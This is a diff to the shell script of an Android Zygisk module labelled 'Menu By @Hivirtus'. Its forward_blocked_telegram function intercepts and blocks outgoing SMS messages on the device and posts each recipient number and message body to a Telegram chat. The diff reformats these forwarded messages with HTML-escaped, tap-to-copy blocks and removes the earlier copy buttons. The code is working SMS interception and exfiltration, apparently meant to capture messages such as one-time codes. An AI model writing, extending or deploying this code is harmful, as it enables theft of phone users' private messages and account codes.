@@ -930,6 +930,10 @@ tg_json_escape() {
   printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' -e 's/\t/\\t/g' -e 's/\r/\\r/g' | awk 'BEGIN{ORS=""} {gsub(/\n/,"\\n"); print}'
 }
 
+tg_html_escape() {
+  printf '%s' "$1" | sed -e 's/&/\&amp;/g' -e 's/</\&lt;/g' -e 's/>/\&gt;/g'
+}
+
 tg_clip_copy() {
   printf '%s' "$1" | head -c 350
 }
@@ -1052,22 +1056,20 @@ forward_blocked_telegram() {
   [ -z "$TO_NUM" ] && TO_NUM="—"
   MSG_BODY="$BLOCKED_BODY"
 
-  # Screenshot format — One-tap ONLY in button, NOT inside message text
-  ONE_TAP="To: ${TO_NUM}
-Message: ${MSG_BODY}"
+  # User screenshot: monospaced To/Body = Telegram tap-to-copy (no buttons)
+  HTML_TO=$(tg_html_escape "$TO_NUM")
+  HTML_BODY=$(tg_html_escape "$MSG_BODY")
+  TEXT="📱 Intercepted Outgoing Zygisk Mode Menu By @Hivirtus 🔥
 
-  TEXT="📱 SMS Intercepted Zygisk Mode
-Menu By @Hivirtus 🔥 --------------------
-📞 To: ${TO_NUM}
-💬 Message:
-${MSG_BODY}"
+To (Tap to copy):
+<code>${HTML_TO}</code>
+
+Body (Tap to copy):
+<code>${HTML_BODY}</code>"
 
   ESC_TEXT=$(tg_json_escape "$TEXT")
-  ESC_TAP=$(tg_json_escape "$(tg_clip_copy "$ONE_TAP")")
-  ESC_BODY=$(tg_json_escape "$(tg_clip_copy "$MSG_BODY")")
-  ESC_TO=$(tg_json_escape "$(tg_clip_copy "$TO_NUM")")
   PAYLOAD="/data/local/tmp/hivirtus_tg_payload.json"
-  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true,\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"📞 Number copy\",\"copy_text\":{\"text\":\"${ESC_TO}\"}},{\"text\":\"💬 SMS copy\",\"copy_text\":{\"text\":\"${ESC_BODY}\"}}],[{\"text\":\"📋 One-tap copy\",\"copy_text\":{\"text\":\"${ESC_TAP}\"}}]]}}" > "$PAYLOAD"
+  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"parse_mode\":\"HTML\",\"disable_web_page_preview\":true}" > "$PAYLOAD"
   SENT=0
   RESP="/data/local/tmp/hivirtus_tg_last_response.txt"
   if tg_http_post "$PAYLOAD" "$RESP"; then SENT=1; fi
